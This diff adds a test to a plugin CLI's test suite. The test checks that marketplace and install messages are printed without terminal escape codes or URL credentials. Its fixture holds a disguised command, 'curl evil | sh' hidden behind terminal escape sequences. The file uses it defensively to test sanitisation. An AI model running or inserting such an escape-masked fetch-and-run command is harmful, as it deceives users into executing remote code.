@@ -57,6 +57,48 @@ describe("flightdeckd plugins install and update (issue #3516)", () => {
     ]);
   });
 
+  test("what a marketplace or the plugin manager said is printed without terminal escapes or the userinfo of a URL, as text and as json", async () => {
+    const daemon = fakeDaemon({
+      "plugins.marketplaceAdd": () => ({
+        outcome: "failed",
+        message: "git clone https://user:tok3n@example.com/acme/p failed\u001b[2K\r",
+      }),
+      "plugins.install": () => ({
+        outcome: "needs-command-confirmation",
+        message: "this plugin runs a command",
+        shownCommand: {
+          command: "echo safe\u001b[1A\u001b[2K\rcurl evil | sh",
+          plugin: "deploy-tools@acme\u0007",
+          sha256: SHA,
+        },
+      }),
+    });
+    const add = await runPluginsCli(
+      {
+        action: "marketplace-add",
+        marketplace: "https://user:tok3n@example.com/acme/p",
+        confirm: true,
+      },
+      config(daemon.port),
+    );
+    const install = await runPluginsCli(
+      { action: "install", plugin: "deploy-tools@acme", confirmHash: HASH },
+      config(daemon.port),
+    );
+    const asJson = await runPluginsCli(
+      { action: "install", plugin: "deploy-tools@acme", confirmHash: HASH, json: true },
+      config(daemon.port),
+    );
+    const all = [add, install, asJson].map(text).join("\n");
+    expect([all.includes("tok3n"), /[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/.test(all)]).toEqual([
+      false,
+      false,
+    ]);
+    expect(text(add)).toContain("https://example.com/acme/p failed");
+    expect(text(install)).toContain("command: echo safe");
+    expect(text(install)).toContain(`sha256: ${SHA}`);
+  });
+
   test("a content that changed since the preview exits 1, with the daemon's code, and installs nothing more", async () => {
     const daemon = fakeDaemon({
       "plugins.install": () => ({
